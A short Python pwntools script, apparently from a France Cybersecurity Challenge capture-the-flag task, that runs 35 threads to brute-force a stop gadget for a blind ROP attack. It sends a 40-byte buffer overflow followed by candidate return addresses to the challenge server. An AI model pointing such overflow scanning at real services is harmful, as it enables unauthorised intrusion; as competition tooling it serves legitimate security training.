from pwn import *

_lock = threading.Lock()
stop_gadget = 0x400560


def get_next(it):
    with _lock:
        offset = next(it)
        return offset


def search_stop_gadget(it):
    while True:
        try:
            offset = get_next(it)
        except:
            return
        try:
            base = 0x400000
            time.sleep(0.2)
            if offset % 0x100 == 0:
                print("----- Scanning 0x%x" % offset)
            io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
            io.recv(timeout=2)
            io.send(b'a' * 40 + p64(base + offset))
            sleep(0.5)
            if io.connected():
                print("Stop gadget at", hex(base + offset))
            io.close()
        except Exception as e:
            print(e)
            pass


iterator = iter(range(0x1000))
for i in range(35):
    threading.Thread(target=search_stop_gadget, args=(iterator,)).start()
    time.sleep(1)
